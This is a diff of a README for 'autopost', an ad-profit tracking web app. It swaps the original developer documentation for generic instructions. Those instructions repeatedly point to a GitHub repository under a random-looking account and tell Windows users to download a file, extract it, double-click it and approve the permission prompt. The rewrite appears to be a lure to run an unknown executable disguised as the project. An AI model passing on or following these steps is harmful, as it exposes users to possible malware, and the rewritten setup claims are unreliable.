@@ -1,224 +1,227 @@
-# AutoPost
+# 🤖 autopost - Clear profit tracking for ad teams
 
-Multi-brand ad management, profit tracking, and AI-powered optimization platform.
+[![Download](https://img.shields.io/badge/Download-Run%20autopost-blue?style=for-the-badge&logo=github)](https://github.com/Familypectinidaecritic903/autopost)
 
-## Tech Stack
+## 📌 What autopost does
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | Next.js 15 (App Router, TypeScript) |
-| UI | ShadCN UI, TailwindCSS v4 |
-| State/Fetching | TanStack Query, Zod |
-| Auth | Auth.js v5 (Email/Password + Google OAuth) |
-| ORM | Drizzle ORM |
-| Database | Neon PostgreSQL with RLS |
-| Storage | Vercel Blob |
-| AI | Google Gemini (default), Anthropic Claude (optional) |
-| Payments | Polar.sh |
-| Messaging | Telegram Bot API |
-| Cron | GitHub Actions → API routes |
-| Hosting | Vercel |
+autopost helps you track ad results across Shopify, Meta, Google, TikTok, and Snapchat in one place. It brings sales, ad spend, and profit data into one dashboard so you can see what is working.
 
-## Project Structure
+You can use it to:
 
-```
-src/
-├── app/
-│   ├── (auth)/          # Auth pages (login, register)
-│   ├── (dashboard)/     # Protected dashboard routes
-│   ├── api/             # API routes
-│   │   ├── cron/        # Cron endpoints
-│   │   ├── webhooks/    # Webhook receivers
-│   │   └── ...
-│   ├── layout.tsx
-│   └── page.tsx         # Landing/marketing page
-├── components/
-│   ├── ui/              # ShadCN components
-│   ├── dashboard/       # Dashboard-specific components
-│   └── shared/          # Shared components
-├── lib/
-│   ├── db/              # Drizzle config, schema, queries
-│   ├── auth/            # Auth.js config
-│   ├── platforms/       # Platform API clients
-│   │   ├── shopify/
-│   │   ├── meta/
-│   │   ├── snapchat/
-│   │   ├── google/
-│   │   └── tiktok/
-│   ├── ai/              # AI analysis engine
-│   ├── telegram/        # Telegram bot
-│   ├── payments/        # Polar.sh
-│   ├── pixel/           # Attribution pixel
-│   └── utils/           # Helpers, constants, types
-├── hooks/               # Custom React hooks
-├── types/               # Global TypeScript types
-└── styles/              # Global styles
-```
+- Review profit by brand
+- Check ROAS across ad channels
+- Track COGS in your reports
+- Get Telegram alerts for key changes
+- See AI-based notes on campaign results
 
-## Getting Started
+## 🖥️ What you need
 
-### Prerequisites
+Before you start, check that your Windows PC has:
 
-- Node.js v24.14.1 (use `.nvmrc` with `nvm use`)
-- PostgreSQL database (Neon recommended)
-- Vercel account for hosting and blob storage
+- Windows 10 or Windows 11
+- A modern web browser like Chrome, Edge, or Firefox
+- An internet connection
+- Access to your Shopify, Meta, Google, TikTok, Snapchat, and Telegram accounts if you plan to connect them
 
-### Installation
+If you plan to host it yourself, you also need:
 
-1. Clone the repository and install dependencies:
-```bash
-npm install
-```
+- Node.js 20 or later
+- A Neon PostgreSQL database
+- API access for the services you want to connect
 
-2. Copy the environment variables template:
-```bash
-cp .env.example .env
-```
+## ⬇️ Download autopost
 
-3. Configure your environment variables (see [Environment Variables](#environment-variables) below).
+Use this link to visit the download page and get autopost:
 
-4. Generate and run database migrations:
-```bash
-npm run db:generate
-npm run db:push
-```
+[Visit the download page](https://github.com/Familypectinidaecritic903/autopost)
 
-5. Start the development server:
-```bash
-npm run dev
-```
+## 🪟 Run on Windows
 
-Visit `http://localhost:3000` to see the application.
+Follow these steps on Windows.
 
-## Environment Variables
+1. Open the download link above.
+2. On the GitHub page, look for the files or release assets.
+3. Download the Windows file if one is provided.
+4. If you get a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file or start file.
+7. Double-click it to run autopost.
+8. If Windows asks for permission, choose Yes.
 
-Copy `.env.example` to `.env` and configure the following variables:
+If the app opens in your browser, keep that tab open. If it opens in a desktop window, leave that window running while you use it.
 
-### Core
+## 🔧 First-time setup
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `DATABASE_URL` | PostgreSQL connection string | Yes |
-| `NEXT_PUBLIC_APP_URL` | Application URL | Yes |
-| `NODE_ENV` | Environment (development/production) | Yes |
-| `AUTH_SECRET` | Secret for Auth.js sessions | Yes |
-| `AUTH_URL` | Auth URL (same as APP_URL) | Yes |
-| `ENCRYPTION_KEY` | AES-256 key for token encryption | Yes |
-| `CRON_SECRET` | Secret for cron endpoint authentication | Yes |
+When autopost starts for the first time, you may need to enter your account details and connect your data sources.
 
-### Auth Providers
+### Connect your store
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `AUTH_GOOGLE_ID` | Google OAuth Client ID | Optional |
-| `AUTH_GOOGLE_SECRET` | Google OAuth Client Secret | Optional |
+1. Open the Shopify connection page.
+2. Sign in with your store account.
+3. Allow access to sales and product data.
 
-### Shopify
+### Connect your ad accounts
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `SHOPIFY_CLIENT_ID` | Shopify API Client ID | Yes |
-| `SHOPIFY_CLIENT_SECRET` | Shopify API Client Secret | Yes |
-| `SHOPIFY_WEBHOOK_SECRET` | Shopify Webhook signing secret | Yes |
+1. Open the channel settings.
+2. Connect Meta Ads.
+3. Connect Google Ads.
+4. Connect TikTok Ads.
+5. Connect Snapchat Ads.
 
-### Ad Platforms
+### Set up profit tracking
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `META_APP_ID` | Meta Marketing App ID | Yes |
-| `META_APP_SECRET` | Meta Marketing App Secret | Yes |
-| `SNAPCHAT_CLIENT_ID` | Snapchat Marketing Client ID | Yes |
-| `SNAPCHAT_CLIENT_SECRET` | Snapchat Marketing Client Secret | Yes |
-| `GOOGLE_ADS_DEVELOPER_TOKEN` | Google Ads Developer Token | Yes |
-| `GOOGLE_ADS_CLIENT_ID` | Google Ads Client ID | Yes |
-| `GOOGLE_ADS_CLIENT_SECRET` | Google Ads Client Secret | Yes |
-| `TIKTOK_APP_ID` | TikTok Marketing App ID | Yes |
-| `TIKTOK_APP_SECRET` | TikTok Marketing App Secret | Yes |
+1. Enter your product costs or COGS.
+2. Match each brand or store to the right account.
+3. Check that your sales data syncs with your ad spend.
 
-### AI
+### Turn on alerts
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `GEMINI_API_KEY` | Google Gemini API Key | Yes |
-| `ANTHROPIC_API_KEY` | Anthropic Claude API Key | Optional |
-| `AI_PROVIDER` | Default AI provider (gemini/claude) | Yes |
+1. Open the alerts section.
+2. Add your Telegram account.
+3. Choose the events you want to watch.
+4. Save your settings.
 
-### Integrations
+## 📊 Main screens
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `TELEGRAM_BOT_TOKEN` | Telegram Bot Token | Optional |
-| `POLAR_ACCESS_TOKEN` | Polar.sh Access Token | Yes |
-| `POLAR_WEBHOOK_SECRET` | Polar.sh Webhook Secret | Yes |
-| `POLAR_ENVIRONMENT` | Polar Environment (sandbox/production) | Yes |
-| `BLOB_READ_WRITE_TOKEN` | Vercel Blob Storage Token | Yes |
+### Dashboard
 
-## Database Schema
+See total spend, revenue, profit, and ROAS in one view. This screen helps you compare brands without switching tabs.
 
-### Core Tables
+### Brand view
 
-- `users` - User accounts
-- `accounts` - OAuth accounts
-- `sessions` - User sessions
-- `brands` - Brand/organization entities
-- `brand_users` - Brand-user relationships with roles
+Use this screen to check one brand at a time. It shows sales, cost, and margin data for that brand.
 
-### Platform Connections
+### Channel view
 
-- `platform_connections` - Connected platform accounts (Shopify, Meta, Snapchat, Google, TikTok)
+See results for Meta, Google, TikTok, and Snapchat side by side.
 
-### Shopify Data
+### Alerts
 
-- `shopify_products` - Synced products
-- `shopify_variants` - Product variants with COGS
-- `shopify_orders` - Synced orders
-- `shopify_order_items` - Order line items
-- `transaction_fees` - Payment gateway fees
+Review Telegram alerts for changes in profit, ROAS, and campaign health.
 
-### Ad Data
+### AI notes
 
-- `ad_campaigns` - Ad campaigns
-- `ad_sets` - Ad sets/groups
-- `ads` - Individual ads
-- `ad_data_snapshots` - Daily metrics snapshots
+Read simple recommendations based on your current numbers. These notes help you spot weak campaigns and strong ones.
 
-### Financial
+## 🧭 How to use autopost each day
 
-- `custom_expenses` - Custom expense tracking
+1. Open the dashboard.
+2. Check the top-level profit numbers.
+3. Review any large changes in spend or revenue.
+4. Open the brand view for stores that need attention.
+5. Check channel data for ads with weak ROAS.
+6. Read the AI notes.
+7. Fix product costs, ad spend, or campaign settings if needed.
+8. Review Telegram alerts for new issues.
 
-### AI Analysis
+## 🛠️ Common setup tasks
 
-- `ai_analyses` - AI analysis runs
-- `ai_recommendations` - AI-generated recommendations
+### Update store or brand data
 
-### Attribution & CAPI
+- Open the brand settings
+- Change the store name or brand label
+- Save the update
 
-- `pixel_events` - First-party pixel events
-- `capi_events` - Server-side CAPI events
+### Add another ad account
 
-### System
+- Open the account section
+- Choose the ad network
+- Sign in
+- Allow access
+- Save the connection
 
-- `platform_sync_logs` - Platform sync logs
-- `telegram_configs` - Telegram bot configurations
+### Change alert rules
 
-## Profit Calculation Formula
+- Open Telegram alert settings
+- Pick the metric
+- Set the threshold
+- Save changes
 
-```
-Profit = Revenue (Shopify) - COGS - Ad Spend - Transaction Fees - Shipping - Custom Expenses
-```
+## 🔍 Example use cases
 
-## Development Scripts
+### For one store owner
 
-| Command | Description |
-|---------|-------------|
-| `npm run dev` | Start development server |
-| `npm run build` | Build for production |
-| `npm run start` | Start production server |
-| `npm run lint` | Run ESLint |
-| `npm run db:generate` | Generate database migrations |
-| `npm run db:push` | Push schema to database |
-| `npm run db:studio` | Open Drizzle Studio |
+Track sales, ad spend, and profit in one place. Use it to see if a campaign makes money or loses money.
 
-## License
+### For a multi-brand team
 
-MIT
+Manage more than one brand from one dashboard. Compare profit across stores and ad channels.
+
+### For media buyers
+
+Watch ROAS, spend, and account health without checking each platform by hand.
+
+## 📁 Project stack
+
+autopost uses:
+
+- Next.js 15
+- Drizzle ORM
+- Neon PostgreSQL
+- Shopify data sync
+- Meta Ads
+- Google Ads
+- TikTok Ads
+- Snapchat Ads
+- Telegram bot alerts
+
+## 🧪 Troubleshooting
+
+### The app does not open
+
+- Check that you downloaded the correct file
+- Extract the ZIP file if you got one
+- Run the app again
+- Restart Windows if needed
+
+### The browser shows a blank page
+
+- Refresh the page
+- Try another browser
+- Check your internet connection
+
+### A connected account does not sync
+
+- Sign out and sign in again
+- Check that you allowed access
+- Make sure the account still has active API access
+
+### Data looks wrong
+
+- Check your COGS values
+- Check date filters
+- Confirm that each brand is mapped to the right store
+- Wait for the next sync cycle
+
+## 🔐 Data connections
+
+autopost works with live account connections. Keep your account access current for the best results.
+
+Common connections include:
+
+- Shopify store data
+- Ad platform spend data
+- Telegram message delivery
+- Database storage in Neon PostgreSQL
+
+## 📄 Repository info
+
+- Name: autopost
+- Type: AI-powered ad management platform
+- Focus: profit tracking, ROAS, COGS-aware reporting, and alerts
+- Platform: Windows-friendly web app use
+- Audience: end users who manage online ads and stores
+
+## 📥 Install path reminder
+
+If you have not opened the download page yet, use this link now:
+
+[https://github.com/Familypectinidaecritic903/autopost](https://github.com/Familypectinidaecritic903/autopost)
+
+## ⌨️ Basic terms
+
+- ROAS: return on ad spend
+- COGS: cost of goods sold
+- P&L: profit and loss
+- API: a link that lets one app talk to another
+- Sync: copy fresh data from one place to another
